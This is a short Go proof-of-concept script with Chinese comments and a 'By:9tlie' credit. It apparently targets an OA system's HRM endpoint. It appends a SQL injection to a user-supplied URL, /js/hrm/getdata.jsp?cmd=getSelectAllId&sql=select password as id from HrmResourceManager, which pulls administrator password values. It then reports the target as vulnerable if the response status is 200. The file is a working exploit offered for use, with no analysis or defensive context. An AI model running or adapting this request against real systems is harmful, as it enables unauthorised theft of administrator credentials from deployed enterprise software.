package main

import (
  "flag"
  "fmt"
  "net/http"
)

func main() {
  // 定义一个名为 url 的 string 类型的 flag
  urlPtr := flag.String("u", "", "The URL to visit")
  fmt.Println("By:9tlie")
  // 解析命令行参数
  flag.Parse()

  // 将命令行参数的值赋给 url 变量
  url := *urlPtr + "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"

  // 调用 poc 函数
  poc(url , urlPtr)
}

func poc(url string, urlPtr *string) {
  // 创建一个 HTTP 客户端
  client := &http.Client{}

  // 创建一个 GET 请求
  req, err := http.NewRequest("GET", url, nil)
  if err != nil {
    fmt.Println(err)
    return
  }

  // 发送请求并获取响应
  resp, err := client.Do(req)
  if err != nil {
    fmt.Println(err)
    return
  }

  // 打印响应状态码
  //fmt.Println(resp.StatusCode)

  code := resp.StatusCode

  if code == 200 {
    fmt.Println(*urlPtr,"存在漏洞。")
  } else {
    fmt.Println(*urlPtr,"不存在漏洞。")
  }

}